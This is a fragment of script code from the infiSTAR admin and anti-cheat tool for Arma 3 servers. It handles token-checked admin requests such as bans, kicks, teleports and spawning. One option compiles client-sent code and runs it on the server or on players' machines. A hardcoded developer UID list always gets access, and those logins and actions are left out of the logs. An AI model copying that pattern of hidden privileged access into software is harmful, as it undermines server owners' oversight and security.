			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq option is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _option != 'SCALAR')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq option wrong typeName: %1   %2 (v0245)',typeName _option,_option];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		_playerObj = _array select 1;
		if(isNil '_playerObj')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq playerObj is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _playerObj != 'OBJECT')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq playerObj wrong typeName: %1   %2 (v0245)',typeName _playerObj,_playerObj];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(isNull _playerObj)exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq playerObj is Null (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if!(_ObjFromNetID isEqualTo _playerObj)then
		{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq playerObj != _ObjFromNetID - %1/2  (v0245)',_playerObj,_ObjFromNetID];
			_log call FNC_A3_SURVEILLANCELOG;
			_playerObj = _ObjFromNetID;
		};
		
		if(!isPlayer _playerObj)then
		{
			if(_option == 1234)then
			{
				_puid = _array select 2;
				if(isNil '_puid')exitWith{
					_mytime = call fnc_getserverTime;
					_log = _mytime + 'AdminReq puid is Nil (v0245)';
					_log call FNC_A3_SURVEILLANCELOG;
				};
				if(typeName _puid != 'STRING')exitWith{
					_mytime = call fnc_getserverTime;
					_log = _mytime + format['AdminReq puid wrong typeName: %1   %2 (v0245)',typeName _puid,_puid];
					_log call FNC_A3_SURVEILLANCELOG;
				};
				
				_mytime = call fnc_getserverTime;
				_log = format['AdminReq playerObj is not a player   %1(%2 - %3) - trying to resolve player via allPlayers (v0245)',name _playerObj,getPlayerUID _playerObj,_puid];
				_log = _mytime + _log;
				_log call FNC_A3_SURVEILLANCELOG;
				if(_puid == '')exitWith{};
				{
					if(getPlayerUID _x == _puid)exitWith
					{
						_playerObj = _x;
						_log = format['AdminReq playerObj has been found! %1(%2)',name _playerObj,getPlayerUID _playerObj];
						_log = _mytime + _log;
						_log call FNC_A3_SURVEILLANCELOG;
					};
				} forEach allPlayers;
			};
		};
		if(!isPlayer _playerObj)exitWith{
			_mytime = call fnc_getserverTime;
			_log = format['AdminReq playerObj is not a player   %1(%2) (v0245)',name _playerObj,getPlayerUID _playerObj];
			_log = _mytime + _log;
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		_tokenreceived = _this select 0;
		if(isNil '_tokenreceived')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq tokenreceived is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _tokenreceived != 'STRING')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq tokenreceived wrong typeName: %1   %2 (v0245)',typeName _tokenreceived,_tokenreceived];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(_tokenreceived == '')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq tokenreceived is empty (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		
		if(isNil '_clientUID')then{_clientUID == '';};
		if(_clientUID isEqualTo '')then
		{
			if(isNil '"+_BigTokenArray+"')then{"+_BigTokenArray+" = [];};
			_foundtokenid = "+_BigTokenArray+" find _tokenreceived;
			if(_foundtokenid > 0)then
			{
				_puidfound = "+_BigTokenArray+" select (_foundtokenid - 1);
				if(!isNil '_puidfound')then
				{
					_clientUID = _puidfound;
					{if(getPlayerUID _x == _clientUID)exitWith{_clientName = name _x;};} forEach allPlayers;				
					_mytime = call fnc_getserverTime;
					_log = _mytime + format['%1(%2) | AdminReq - SERVER RESOLVED UID! (v0245)',_clientName,_clientUID];
					_log call FNC_A3_SURVEILLANCELOG;
				};
			};
		};
		_result=false;
		_result = [_clientUID,_tokenreceived] call "+_server_checkTokenR+";
		if(!_result)exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['%1(%2) | AdminReq - BadToken %3 (v0245)',_clientName,_clientUID,_tokenreceived];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		_locDevs = "+str _devs+";
		_fnc_NoUID = {
			if(_clientUID in _locDevs)exitWith{};
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['%1(%2) | AdminReq - !!!!!!ADMIN-LOGIN-ERROR!!!!!! (v0245)',_clientName,_clientUID];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		call {
			if(typeName _clientUID != 'STRING')exitWith{call _fnc_NoUID;};
			if(_clientUID == '')exitWith{call _fnc_NoUID;};
			if(_clientUID == '0')exitWith{call _fnc_NoUID;};
			if(_clientUID == ' ')exitWith{call _fnc_NoUID;};
		};
		if!(_clientUID in _allPlayers)exitWith
		{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['%1(%2) | AdminReq - Attempted to Use the AdminMenu (v0245)',_clientName,_clientUID];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		if(_option == 1234)exitWith
		{
			_puid = _array select 2;
			if(_puid == _clientUID)then
			{
				if!(_clientUID in _locDevs)then{
					diag_log format['<infiSTAR.de> ******ADMIN-LOGIN******: %1(%2) (v0245)',_clientName,_clientUID];
				};
				"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
				_clientID publicVariableClient '"+_AH_HackLogArrayRND+"';
				_clientID publicVariableClient '"+_AH_SurvLogArrayRND+"';
				_clientID publicVariableClient '"+_AH_AdmiLogArrayRND+"';
				"; }; _A3AHstring = _A3AHstring + "
				if(isNil'"+_TMPBAN+"')then{"+_TMPBAN+"=[];}else{if(typeName "+_TMPBAN+"!='ARRAY')then{"+_TMPBAN+"=[];};};
				_clientID publicVariableClient '"+_TMPBAN+"';
				if(isNil'infiSTAR_MAIN_CODE')exitWith{
					[
						'',
						{[] spawn {for '_i' from 0 to 5 do {systemchat 'Admin Code not compiled, relog in a few seconds please!';};};},
						_clientID,
						false
					] call FN_infiSTAR_S;
				};
				
				[
					'',
					{
						_puid = getPlayerUID Player;
						passwordAdmin = "+str _passwordAdmin+";
						INFISTARVERSION='02-Dec-2016 18-49-36-v0245';
						OPEN_ADMIN_MENU_KEY = "+str _OPEN_ADMIN_MENU_KEY+";
						diag_log format['<infiSTAR.de> OPEN_ADMIN_MENU_KEY: %1',OPEN_ADMIN_MENU_KEY];
						ADMINLEVELACCESS = compile '
							_puid = getPlayerUID player;
							if(_puid in "+str _devs+")exitWith{true};
							if(isNil''MY_PERSONAL_ACCESS_ARRAY'')then
							{
								MY_PERSONAL_ACCESS_ARRAY = [];
								_adminUIDandAccess = nil;
								_adminUIDandAccess = "+str _adminUIDandAccess+";
								if(!isNil''_adminUIDandAccess'')then
								{
									if(typeName _adminUIDandAccess == ''ARRAY'')then
									{
										if(count _adminUIDandAccess > 0)then
										{
											{
												_level1 = nil;
												_level1 = _x;
												if(!isNil''_level1'')then
												{
													if(typeName _level1 == ''ARRAY'')then
													{
														if(count _level1 == 2)then
														{
															_uids = nil;
															_uids = _level1 select 0;
															_uidsstate = false;
															if(!isNil''_uids'')then
															{
																if(typeName _uids == ''ARRAY'')then
																{
																	if(count _uids > 0)then
																	{
																		_uidsstate = true;
																	};
																};
															};
															if(_uidsstate)then
															{
																_access = nil;
																_access = _level1 select 1;
																if(!isNil''_access'')then
																{
																	if(typeName _access == ''ARRAY'')then
																	{
																		if(count _access > 0)then
																		{
																			if(_puid in _uids)then{MY_PERSONAL_ACCESS_ARRAY = _access;};
																		};
																	};
																};
															};
														};
													};
												};
											} forEach _adminUIDandAccess;
										};
									};
								};
							};
							if(_this in MY_PERSONAL_ACCESS_ARRAY)exitWith{true};
						';
						admin_d0 = {[_this,0] call admin_d0_MASTER;};
						admin_d0_server = {[_this,1] call admin_d0_MASTER;};
						admin_d0_target = {[_this,2] call admin_d0_MASTER;};
						admin_d0_MASTER = {
							private['_do','_opt','_targetObj'];
							_opt = _this select 1;
							if(isNil'_opt')exitWith{};
							_do = _this select 0 select 0;
							if(isNil'_do')exitWith{};
							if(typename _do == 'CODE')then{_do = (str(_do)) select [1,((count(str(_do)))-2)];};
							if(typename _do != 'STRING')exitWith{systemChat 'admin_d0 needs STRING code!';};
							if(_opt isEqualTo 2)exitWith
							{
								_targetObj = _this select 0 select 1;
								if(isNil '_targetObj')exitWith{systemChat 'admin_d0_target has no object';};
								if(typename _targetObj != 'OBJECT')exitWith{systemChat 'admin_d0_target has no object';};
								if(isNull _targetObj)exitWith{systemChat 'admin_d0_target has no object';};
								[69,player,_opt,toArray _do,netId _targetObj] call fnc_AdminReq;
							};
							[69,player,_opt,toArray _do] call fnc_AdminReq;
						};
						"; if(_LogAdminActions)then{ _A3AHstring = _A3AHstring + "
							if(isNil 'fnc_adminLog')then{if(_puid in "+str _devs+")then{fnc_adminLog = compileFinal '';}else{fnc_adminLog = compileFinal '[profileName,getPlayerUID player,''ALOG'',toArray _this] call "+_AH1311KICKLOG+";';};};
						"; }else{ _A3AHstring = _A3AHstring + "
							if(isNil 'fnc_adminLog')then{fnc_adminLog = compileFinal '';};
						"; }; _A3AHstring = _A3AHstring + "
						if(isNil '"+_AH_HackLogArrayRND+"')then{"+_AH_HackLogArrayRND+" = [];};
						if(isNil 'AH_HackLogArray')then{AH_HackLogArray = "+_AH_HackLogArrayRND+";};
						'"+_AH_HackLogArrayRND+"' addPublicVariableEventHandler
						{
							_array = _this select 1;
							AH_HackLogArray = _array;
							if(str _array != '[]')then{
								_log = _array select ((count _array)-1);
								if(isNil 'AdminAnnounceDisabled')then
								{
									cutText [_log, 'PLAIN DOWN'];
									hint _log;
								};
								diag_log _log;
							};
						};
						if(isNil '"+_AH_SurvLogArrayRND+"')then{"+_AH_SurvLogArrayRND+" = [];};
						if(isNil 'AH_SurvLogArray')then{AH_SurvLogArray = "+_AH_SurvLogArrayRND+";};
						'"+_AH_SurvLogArrayRND+"' addPublicVariableEventHandler
						{
							_array = _this select 1;
							AH_SurvLogArray = _array;
							if(str _array != '[]')then{
								_log = _array select ((count _array)-1);
								diag_log _log;
							};
						};
						if(isNil '"+_AH_AdmiLogArrayRND+"')then{"+_AH_AdmiLogArrayRND+" = [];};
						if(isNil 'AH_AdmiLogArray')then{AH_AdmiLogArray = "+_AH_AdmiLogArrayRND+";};
						'"+_AH_AdmiLogArrayRND+"' addPublicVariableEventHandler
						{
							_array = _this select 1;
							AH_AdmiLogArray = _array;
							if(str _array != '[]')then{
								_log = _array select ((count _array)-1);
								diag_log _log;
							};
						};
						if(isNil'"+_TMPBAN+"')then{"+_TMPBAN+"=[];}else{if(typeName "+_TMPBAN+"!='ARRAY')then{"+_TMPBAN+"=[];};};
						if(isNil 'PVAH_AHTMPBAN')then{PVAH_AHTMPBAN = "+_TMPBAN+";};
						'"+_TMPBAN+"' addPublicVariableEventHandler
						{
							PVAH_AHTMPBAN = "+_TMPBAN+";
						};
					},
					_clientID,
					false
				] call FN_infiSTAR_S;
				
				['',infiSTAR_MAIN_CODE,_clientID,false] call FN_infiSTAR_S;
			};
		};
		if(_option isEqualTo 69)exitWith
		{
			_opt = _array select 2;
			_code = _array select 3;
			_code = toString _code;
			_code = compile _code;
			if(_opt isEqualTo 0)exitWith{call _code;['',_code,-2,false] call FN_infiSTAR_S;};
			if(_opt isEqualTo 1)exitWith{call _code;};
			if(_opt isEqualTo 2)exitWith{
				_target = objectFromnetId(_array select 4);
				if(isNil '_target')exitWith{};
				if(typename _target != 'OBJECT')exitWith{};
				if(isNull _target)exitWith{};
				_owner = owner _target;
				if(_owner in [0,-2,2])exitWith{};
				['',_code,_owner,false] call FN_infiSTAR_S;
			};
		};
		if(_option == -668)exitWith
		{
			_clearLog = _array select 2;
			_adminObjects = [];{if((getPlayerUID _x) in _allPlayers)then{_adminObjects pushBack _x;};} forEach allPlayers;
			if(_clearLog == 0)then
			{
				{
					if(!isNull _x)then
					{
						"+_AH_HackLogArrayRND+" = [];(owner _x) publicVariableClient '"+_AH_HackLogArrayRND+"';
						"+_AH_SurvLogArrayRND+" = [];(owner _x) publicVariableClient '"+_AH_SurvLogArrayRND+"';
					};
				} forEach _adminObjects;
			}
			else
			{
				{
					if(!isNull _x)then
					{
						"+_AH_AdmiLogArrayRND+" = [];(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';
					};
				} forEach _adminObjects;
			};
		};
		if(_option == -667)exitWith
		{
			_puid = _array select 2;
			if(isNil'"+_TMPBAN+"')then{"+_TMPBAN+"=[];}else{if(typeName "+_TMPBAN+"!='ARRAY')then{"+_TMPBAN+"=[];};};
			"+_TMPBAN+" = "+_TMPBAN+" - [_puid];
			{if(getPlayerUID _x in _allPlayers)then{(owner _x) publicVariableClient '"+_TMPBAN+"';};} forEach allPlayers;
		};
		if(_option == -666)exitWith
		{
			_puid = _array select 2;
			_name = _array select 3;
			[_name,_puid,'ADMINBAN'] call FNC_A3_infiSTARBAN;
		};
		if(_option == -665)exitWith
		{
			_puid = _array select 2;
			_name = _array select 3;
			[_name,_puid] call FNC_INFISERVERKICK;
		};
		if(_option == -664)exitWith
		{
			_puid = _array select 2;
			_do = 'if(!isServer)then
			{
				if(getPlayerUID player == '+str _puid+')then
				{
					(findDisplay 46)closeDisplay 0;
				};
			};';
			_do call FNC_A3_GLOBAL;
		};
		if(_option == -663)exitWith
		{
			_puid = _array select 2;
			_name = _array select 3;
			[_name,_puid] call FNC_DO_CLIENT_VAR_DUMP;
		};
		if(_option == -662)exitWith
		{
			private['_inputArray','_case','_input1','_input2','_input3'];
			_inputArray = _array select 2;
			if(isNil '_inputArray')exitWith{};
			_case = -1;
			if(typeName _inputArray != 'ARRAY')then
			{
				_case = _inputArray;
			}
			else
			{
				_case = _inputArray select 0;
				_input1 = if(typeName (_inputArray select 1) == 'ARRAY')then{toString(_inputArray select 1)}else{_inputArray select 1};
				_input2 = if(typeName (_inputArray select 2) == 'ARRAY')then{toString(_inputArray select 2)}else{_inputArray select 2};
				_input3 = if(typeName (_inputArray select 3) == 'ARRAY')then{toString(_inputArray select 3)}else{_inputArray select 3};
			};
			"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
				if(_case == 0)exitWith{'epochserver' callExtension format['901|%1',_input1];};
			"; }; _A3AHstring = _A3AHstring + "
			if(_case == 1)exitWith{'asd' serverCommand '#lock';};
			if(_case == 2)exitWith{'asd' serverCommand '#unlock';};
			if(_case == 3)exitWith{_puid = _input1;_name = _input2;_reason = _input3;[_name,_puid,_reason] call FNC_A3_infiSTARBAN;};
			if(_case == 4)exitWith{_puid = _input1;_name = _input2;[_name,_puid] call FNC_INFISERVERKICK;};
		};
		if(_option == -4)exitWith
		{
			_delete = _array select 2;
			if(typeName _delete != 'ARRAY')then{_delete = [_delete];};
			{
				if(!isNull _x)then
				{
					(vehicle _x) call fnc_deleteObject;
				};
			} forEach _delete;
		};
		if(_option isEqualTo -3)exitWith
		{
			_target = _array select 2;
			_target setOwner 2;
			_pos = getPos _target;
			_pos set[2,(_pos select 2)+2];
			_target setPos _pos;
			_target setVectorUp [0,0,1];
			
			[
				_target,
				{
					_target = _this;
					_pos = getPos _target;
					_pos set[2,(_pos select 2)+2];
					_target setPos _pos;
					_target setVectorUp [0,0,1];
				},
				owner _target,
				false
			] call FN_infiSTAR_S;
		};
		if(_option == -2)exitWith
		{
			_target = _array select 2;
			_target setDamage 5;
		};
		if(_option == -1)exitWith
		{
			[_array select 2] spawn {
				_pos = _this select 0;
				_bolt = 'LightningBolt' createVehicle _pos;
				_bolt setVariable['BIS_enableRandomization',false];
				_bolt setdamage 5;
				_light = '#lightpoint' createVehicle _pos;
				_light setVariable['BIS_enableRandomization',false];
				_light setposatl [_pos select 0,_pos select 1,(_pos select 2) + 10];
				_light setLightDayLight true;
				_light setLightBrightness 300;
				_light setLightAmbient [0.05, 0.05, 0.1];
				_light setlightcolor [1, 1, 2];
				uiSleep 0.1;
				_light setLightBrightness 0;
				uiSleep 0.1;
				_class = ['lightning1_F','lightning2_F'] call bis_Fnc_selectrandom;
				_lightning = _class createVehicle _pos;
				_lightning setVariable['BIS_enableRandomization',false];
				_light setLightBrightness (100 + random 100);
				uiSleep 0.1;
				deleteVehicle _lightning;
				deleteVehicle _light;
			};
		};
		if(_option == 0)exitWith
		{
			private['_position','_dir','_vehObj','_slot','_vehClass','_colors','_color','_config','_selections','_textures','_textureSelectionIndex','_count'];
			_vehClass = _array select 2;
			_position = _array select 3;
			_dir = _array select 4;
			
			_vehObj = _vehClass createVehicle _position;
			_vehObj setVariable['BIS_enableRandomization',false];
			_vehObj setdir _dir;
			clearWeaponCargoGlobal _vehObj;
			clearMagazineCargoGlobal _vehObj;
			clearBackpackCargoGlobal _vehObj;
			clearItemCargoGlobal _vehObj;
			addToRemainsCollector[_vehObj];
			_vehObj disableTIEquipment true;
			"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
			if(_vehObj isKindOf 'Air' || _vehObj isKindOf 'Ship' || _vehObj isKindOf 'LandVehicle')then
			{
				_vehObj call EPOCH_server_setVToken;
				
				_fnc_setSlot =
				{
					_slot = EPOCH_VehicleSlots select 0;
					EPOCH_VehicleSlots = EPOCH_VehicleSlots - [_slot];
					EPOCH_VehicleSlotCount = count EPOCH_VehicleSlots;
					publicVariable 'EPOCH_VehicleSlotCount';
					_vehObj setVariable['VEHICLE_SLOT',_slot,true];
				};
				if!(EPOCH_VehicleSlots isEqualTo[])then
				{
					call _fnc_setSlot;
				}
				else
				{
					_slot = -123;
					{
						_slot = _x getVariable['VEHICLE_SLOT',-123];
						if(str _slot != str(-123))exitWith
						{
							[_x,'infiSTAR.de'] call EPOCH_server_save_killedVehicle;
							deleteVehicle _x;
						};
					} forEach allDead;
					if(str _slot != str(-123))then
					{
						call _fnc_setSlot;
					};
				};
				
				_config = (configFile >> 'CfgVehicles' >> _vehClass >> 'availableColors');
				if(isArray(_config))then
				{
					_textureSelectionIndex = configFile >> 'CfgVehicles' >> _vehClass >> 'textureSelectionIndex';
					_selections = if(isArray(_textureSelectionIndex))then{getArray(_textureSelectionIndex)} else { [0] };
					_colors = getArray(_config);
					_textures = _colors select 0;
					_color = floor (random (count _textures));
					_count = (count _colors)-1;
					{
						if(_count >= _forEachIndex)then
						{
							_textures = _colors select _forEachIndex;
						};
						_vehObj setObjectTextureGlobal [_x, (_textures select _color)];
					} forEach _selections;
					_vehObj setVariable['VEHICLE_TEXTURE',_color];
				};
				_vehObj call EPOCH_server_save_vehicle;
				_vehObj call EPOCH_server_vehicleInit;
			};
			"; }; _A3AHstring = _A3AHstring + "
		};
		if(_option == 1)exitWith
		{
			_unit = _array select 2;
			_pos = _array select 3;
			
			{
				if(!isNull _x)then
				{
					if(isPlayer _x)then
					{
						"+_AHpos+" = [_clientName,_clientUID,_pos];
						(owner _x) publicVariableClient '"+_AHpos+"';
					};
				};
			} forEach (crew (vehicle _unit));
			
			(vehicle _unit) allowDamage false;
			(vehicle _unit) SetVelocity [0,0,1];
			(vehicle _unit) setPosATL _pos;
			(vehicle _unit) allowDamage true;
		};
		if(_option == 2)exitWith
		{
			_state = _array select 2;
			if(_state == 1)then
			{
				_playerObj hideObjectGlobal true;
			}
			else
			{
				_playerObj hideObjectGlobal false;
			};
		};
		if(_option == 3)exitWith
		{
			_pos = _array select 2;
			_click = _array select 3;
			if(isClass (configFile >> 'CfgVehicles' >> _click))exitWith{
				_object = createVehicle [_click,_pos,[],3,'CAN_COLLIDE'];
				_object setVariable['BIS_enableRandomization',false];
				clearWeaponCargoGlobal _object;
				clearMagazineCargoGlobal _object;
				clearBackpackCargoGlobal _object;
				clearItemCargoGlobal _object;
			};
			_object = objNull;
			_WeaponHolders = nearestObjects[_pos,['GroundWeaponHolder','WeaponHolderSimulated','Land_MPS_EPOCH'],5];
			if!(_WeaponHolders isEqualTo [])then{_object = _WeaponHolders select 0;};
			if(isNull _object)then
			{
				_object = createVehicle ['WeaponHolderSimulated',_pos,[],3,'CAN_COLLIDE'];
				_object setVariable['BIS_enableRandomization',false];
			};
			_object addItemCargoGlobal [_click,1];
			if(isClass (configFile >> 'CfgWeapons' >> _click))then
			{
				_magazines = getArray (configFile >> 'CfgWeapons' >> _click >> 'magazines');
				if(str _magazines != '[]')then
				{
					{_object addItemCargoGlobal [_x,3];} forEach _magazines;
				};
			};
			_object setPosATL [_pos select 0,_pos select 1,(_pos select 2)+0.3];
		};
		if(_option == 4)exitWith
		{
			private['_target','_unitClass'];
			_target=_array select 2;
			_unitClass = _array select 3;
			"+_clientdo+" = ""
				_unitClass = ""+str _unitClass+"";
				[] execFSM """"\x\addons\a3_epoch_code\System\Event_Air_Drop.fsm"""";
				_unit = objNull;
				_targetPos = getPosATL player;
				_targetPos set [2,0];
				_disableAI = {
					{_this disableAI _x}forEach[""""TARGET"""",""""AUTOTARGET"""",""""FSM""""];
				};
				_fnc_addBoom = {
					_unit addEventHandler [""""AnimChanged"""", {
						_unit = (_this select 0);
						_pos = getPos _unit;
						_close = {isPlayer _x} count (_pos nearEntities [""""Man"""",10]);
						if(_close > 0)then
						{
							""""BloodSplat"""" createVehicleLocal (getPos (_this select 0));
							""""SmallSecondary"""" createVehicleLocal (getPos (_this select 0));
						};
					}];
					_unit addEventHandler [""""Killed"""", {
						""""BloodSplat"""" createVehicleLocal (getPos (_this select 0));
						""""SmallSecondary"""" createVehicleLocal (getPos (_this select 0));
					}];
				};
				switch _unitClass do {
					case """"Epoch_Cloak_F"""": {
						_unit = createAgent[_unitClass, _targetPos, [], 256, """"FORM""""];
						_unit call _disableAI;
						[_unit] execFSM """"\x\addons\a3_epoch_code\System\cloak.fsm"""";
					};
					case """"GreatWhite_F"""": {
						if(surfaceIsWater _targetPos)then{
							if(((_targetPos vectorDiff getPosASL player) select 2) > 25)then{
								_unit = createAgent[_unitClass, _targetPos, [], 120, """"FORM""""];
								_unit call _disableAI;
								[_unit] execFSM """"\x\addons\a3_epoch_code\System\Shark_Brain.fsm"""";
							}; 
						};
					};
					case """"Epoch_Sapper_F"""": {
						_unit = createAgent[_unitClass, _targetPos, [], 156, """"FORM""""];
						_bomb = createVehicle [""""Sapper_Charge_Ammo"""", _targetPos, [], 0, """"CAN_COLLIDE""""];
						_bomb attachTo [_unit, [0,0,0],""""Pelvis""""];
						_unit call _disableAI;
						sapperHndl = [_unit, _bomb] execFSM """"\x\addons\a3_epoch_code\System\Sapper_Brain.fsm"""";
						_unit addEventHandler [""""FiredNear"""", """"sapperHndl setFSMVariable [""""""""_sFiredNear"""""""",[_this select 1, _this select 2]];""""];
						_unit addEventHandler [""""Hit"""", """"sapperHndl setFSMVariable [""""""""_sHit"""""""",[_this select 1, _this select 2]];""""];
						call _fnc_addBoom;
					};
					case """"Epoch_SapperB_F"""": {
						_unit = createAgent[_unitClass, _targetPos, [], 156, """"FORM""""];
						_bomb = createVehicle[""""SapperB_Charge_Ammo"""", _targetPos, [], 0, """"CAN_COLLIDE""""];
						_bomb attachTo[_unit, [0, 0, 0], """"Pelvis""""];
						_unit call _disableAI;
						sapperHndl = [_unit, _bomb] execFSM """"\x\addons\a3_epoch_code\System\Sapper_Brain2.fsm"""";
						_unit addEventHandler[""""FiredNear"""", """"sapperHndl setFSMVariable [""""""""_sFiredNear"""""""",[_this select 1, _this select 2]];""""];
						_unit addEventHandler[""""Hit"""", """"sapperHndl setFSMVariable [""""""""_sHit"""""""",[_this select 1, _this select 2]];""""];
						call _fnc_addBoom;
					};
					case """"I_UAV_01_F"""": {
						_targetPos = getPosATL player;
						_targetPos = [_targetPos, 600, 1200, 5, 0, 400, 0] call BIS_fnc_findSafePos;
						_targetPos set[2, 600];
						_unit = createVehicle[""""I_UAV_01_F"""", _targetPos, [], 0, """"FLY""""];
						addToRemainsCollector[_unit];
						_unit flyInHeight 600;
						_grp = createGroup RESISTANCE;
						_driver = _grp createUnit[""""I_UAV_AI"""", position _unit, [], 0, """"CAN_COLLIDE""""];
						_driver moveInAny _unit;
						[_unit, player] execFSM """"\x\addons\a3_epoch_code\System\Copter_brain.fsm"""";
					};
					case """"PHANTOM"""": {
						[] execFSM """"\x\addons\a3_epoch_code\System\Phantom_Brain.fsm"""";
					};
					case """"B_Heli_Transport_01_F"""": {
						[] execFSM """"\x\addons\a3_epoch_code\System\Event_Air_Drop.fsm"""";
					};
				};
				if !(isNull _unit)then{
					[_unit] remoteExec [""""EPOCH_localCleanup"""",2];
				};
			"";
			(owner _target) publicVariableClient '"+_clientdo+"';
		};
		if(_option == 5)exitWith
		{
			_target = _array select 2;
			_offset = _array select 3;
			_maxHeight = _array select 4;
			
			_target attachTo [vehicle _playerObj,[0,_offset,_maxHeight]]; 
		};
		if(_option == 6)exitWith
		{
			_offset = _array select 2;
			
			_date = date;
			_date set [3,_offset];
			EPOCH_StaticDateTime = _date;
			setDate _date;
		};
		if(_option == 7)exitWith
		{
			_msg = _array select 2;
			if(typeName _msg == 'ARRAY')then
			{
				_msg = toString _msg;
			};
			{[_msg,_x] call fnc_serverMassMessage;} forEach allPlayers;
		};
		if(_option == 8)exitWith
		{
			private['_player', '_playerUID', '_items', '_class', '_dir', '_location', '_type', '_weapon', '_attachments', '_currWeap', '_itemSlot', '_itemqtys', '_goggles', '_headgear', '_vest', '_backpack', '_uniform', '_weapons', '_magazinesAmmo', '_itemsplayer', '_weaponsplayer', '_group', '_primaryWeapon', '_secondaryWeapon', '_attachment', '_equipped', '_wMags', '_playerGroup', '_droppedWeapons', '_newPlyr', '_token', '_owner', '_reviver'];
			_player = _array select 2;
			if(isNil '_player')exitWith{};
			if(isNull _player)exitWith{};
			if(!local _player)then {
				_playerUID = getPlayerUID _player;
				if(!isNil '_playerUID' && !alive _player)then
				{
					['',{Epoch_canBeRevived = true;},(owner _player),false] call FN_infiSTAR_S;
					_player setVariable['REVIVE',true,true];
					
					_class = typeOf _player;
					if(_class in ['Epoch_Male_F', 'Epoch_Female_F'])then
					{
						if(_player getVariable['REVIVE', true])then
						{
							diag_log format['DEBUG server_revivePlayer : %1', _this];
							_location = getPosATL _player;
							_dir = getDir _player;
							_playerGroup = _player getVariable['GROUP', ''];
							_goggles = goggles _player;
							_headgear = headgear _player;
							_vest = vest _player;
							_backpack = backpack _player;
							_uniform = uniform _player;
							_items = assignedItems _player;
							_magazinesAmmo = magazinesAmmo _player;
							_primaryWeapon = '';
							_secondaryWeapon = '';
							_droppedWeapons = [];
							{
								{
									_droppedWeapons pushBack _x;
									_type = getNumber(configfile >> 'cfgweapons' >> (_x select 0) >> 'type');
									switch _type do {
										case 1: { _primaryWeapon = _x select 0 };
										case 4: { _secondaryWeapon = _x select 0 };
									};
								} forEach (weaponsItemsCargo _x);
							} forEach nearestObjects[_player, ['WeaponHolderSimulated'], 12];
							_itemsplayer = [getItemCargo(uniformContainer _player), getItemCargo(vestContainer _player), getItemCargo(backpackContainer _player)];
							_weaponsplayer = [getWeaponCargo(uniformContainer _player), getWeaponCargo(vestContainer _player), getWeaponCargo(backpackContainer _player)];
							_weapons = [currentWeapon _player, ((weaponsItems _player) + _droppedWeapons), [_primaryWeapon, _secondaryWeapon, handgunWeapon _player]];
							hideObjectGlobal _player;
							_group = grpNull;
							if(_playerGroup != '')then {
								{
									if((_x getVariable['GROUP','']) == _playerGroup)exitWith
									{
										_group = group _x;
									};
								}forEach allPlayers;
								if(isNull _group)then
								{
									_group = createGroup west;
								};
								diag_log format['DEBUG Group Found: %1', _group];
							}
							else
							{
								_group = createGroup west;
								diag_log format['DEBUG Group Created: %1', _group];
							};
							_newPlyr = _group createUnit[_class, _location, [], 0, 'CAN_COLLIDE'];
							addToRemainsCollector[_newPlyr];
							_newPlyr allowDammage false;
							{
								_newPlyr disableAI _x;
							}forEach['FSM', 'MOVE', 'AUTOTARGET', 'TARGET'];
							_newPlyr setVariable ['SETUP', true];
							_newPlyr setVariable ['PUID', _playerUID];
							_newPlyr setVariable ['GROUP', _playerGroup];
							_newPlyr setVariable ['REVIVE', false];
							_newPlyr setDir _dir;
							_newPlyr setPosATL _location;
							_newPlyr setFatigue 1;
							_newPlyr setDamage 0;
							if(_uniform != '')then
							{
								_newPlyr addUniform _uniform;
							};
							if(_backpack != '')then
							{
								_newPlyr addBackpack _backpack;
							};
							if(_goggles != '')then
							{
								_newPlyr addGoggles _goggles;
							};
							if(_headgear != '')then
							{
								_newPlyr addHeadgear _headgear;
							};
							if(_vest != '')then
							{
								_newPlyr addVest _vest;
							};
							if(count _weapons >= 2)then
							{
								_equipped = _weapons select 2;
								{
									_weapon = _x select 0;
									_type = getNumber(configfile >> 'cfgweapons' >> _weapon >> 'type');
									_attachments = [];
									for '_a' from 1 to 3 do
									{
										_attachment = _x select _a;
										if(_attachment != '')then {
											_attachments pushBack _attachment;
										};
									};
									_wMags = (count _x) == 5;
									if(_weapon in _equipped)then
									{
										_equipped = _equipped - [_weapon];
										if(_wMags)then
										{
											_newPlyr addMagazine(_x select 4);
										};
										if(_weapon != '')then
										{
											_newPlyr addWeapon _weapon;
										};
										switch _type do {
											case 1: {
												removeAllPrimaryWeaponItems _newPlyr;
												{ _newPlyr addPrimaryWeaponItem _x }forEach _attachments;
											};
											case 2:	{
												removeAllHandgunItems _newPlyr;
												{ _newPlyr addHandgunItem _x }forEach _attachments;
											};
											case 4:	{
												{
													_newPlyr removeSecondaryWeaponItem _x;
												} forEach(secondaryWeaponItems _newPlyr);
												{ _newPlyr addSecondaryWeaponItem _x }forEach _attachments;
											};
										};
									} else {
										{
											_newPlyr addItem _x;
